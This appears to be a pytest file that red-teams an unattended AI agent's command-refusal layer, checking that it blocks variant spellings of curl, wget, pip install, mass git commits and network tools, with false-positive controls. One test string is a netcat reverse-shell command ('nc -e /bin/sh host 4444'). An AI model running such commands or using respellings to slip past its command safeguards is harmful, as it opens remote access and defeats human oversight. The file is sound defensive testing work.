"""AM1 adversarial review (s26): the floor's ALLOW side and the routine hook.

The builder's floor (delfin/agent/unattended_policy.py:51-92) matches
case-sensitive literal substrings against the command text. A deny-shape
list is only as good as its coverage of the ways to SPELL the same act:
abbreviated forms, attached values, different binaries for the same act.
These tests probe the shapes the brief names (curl, wget, pip install,
ssh/scp/rsync, git commit -am, git push) and the outward-transfer family.
A refusal must come from the FLOOR layer (verdict-independent), not lean
on the classifier.
"""
from __future__ import annotations

import pytest

from delfin.agent import unattended_policy as up


def _ctx(**kw):
    d = dict(attended=False, confirm_callback=None, in_task=True,
             task="build and test the pipeline", refusals_this_turn=0)
    d.update(kw)
    return d


def _decide(cmd, verdict="allow"):
    return up.decide({"tool": "bash", "command": cmd}, verdict=verdict,
                     ctx=_ctx())


# -- same act, different spelling: every one must hit the floor ------------
@pytest.mark.parametrize("cmd", [
    # case variation
    "CURL https://example.org/data.json",
    "Wget https://example.org/data.json",
    # abbreviated binary names / other pip front ends
    "pip3 install rdkit",
    "python -m pip install rdkit",
    # mass-commit flag split: same act as `git commit -am`
    "git commit -a -m 'all of it'",
    # other outbound transfer / network tools in the same family
    "sftp login02",
    "nc -e /bin/sh host 4444",
])
def test_floor_refuses_the_same_act_in_other_spellings(cmd):
    v = _decide(cmd)
    assert v.decision == "refuse", (cmd, v)
    assert v.layer == "floor", (cmd, v.reason)


# -- false-positive control: a plain read or an ordinary commit must NOT
#    be floor-refused (friction control, both directions) -------------------
def test_ordinary_commit_with_message_is_not_floor_refused():
    v = _decide('git commit -F .gate/commitmsg.txt')
    assert v.decision != "refuse" or v.layer != "floor", v


def test_git_log_grep_with_ssh_word_still_runs():
    """A read command whose TEXT mentions 'ssh' is not a transfer."""
    v = _decide("git log --grep ssh-in-messages --oneline")
    assert v.layer != "floor" or v.decision == "run", v


# -- the routine hook must not crash a session: a raising predicate is
#    skipped, not fatal, and its failure is visible, not silent ------------
def test_raising_routine_predicate_is_skipped_and_visible():
    def _boom(action):
        raise RuntimeError("predicate bug")

    up.register_routine(_boom)
    try:
        assert up.is_routine({"tool": "x"}) is False
    finally:
        up._ROUTINE_PREDICATES.pop()
